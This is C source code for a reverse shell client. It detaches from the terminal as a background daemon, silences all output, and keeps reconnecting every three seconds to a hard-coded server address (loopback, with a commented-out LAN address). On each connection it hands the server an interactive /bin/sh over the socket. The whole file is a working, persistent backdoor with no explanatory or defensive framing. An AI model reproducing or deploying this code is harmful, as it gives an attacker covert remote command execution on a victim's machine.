#include <sys/socket.h>
#include "client.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include "../common/common.h"
#include <fcntl.h>

// #define SERVER_IP "192.168.0.14" 
#define SERVER_IP "127.0.0.1" 

int main() {

    pid_t pid = fork();
    if (pid>0){exit(0);}
    setsid();
    int devnull = open("/dev/null", O_RDWR);
    dup2(devnull, 0);  
    dup2(devnull, 1);  
    dup2(devnull, 2);  
    close(devnull); 
    
    while(1){
        int sock_fd = create_socket(AF_INET, SOCK_STREAM);
        if (sock_fd < 0){
            sleep(3);
            continue;
        }
        if(client_connect(sock_fd, AF_INET, PORT, SERVER_IP) < 0){
            sleep(3);
            continue;
        }

        pid_t pid = fork();
        if (pid == 0){
            dup2(sock_fd, STDIN_FILENO);
            dup2(sock_fd, STDOUT_FILENO);
            dup2(sock_fd, STDERR_FILENO);

            char *args[] = {"/bin/sh", NULL};
            extern char **environ;
            execve("/bin/sh", args, environ);
            _exit(0);
        }

        waitpid(pid, NULL, 0);

        close(sock_fd);
        sleep(3);
    }

    return 0;
}














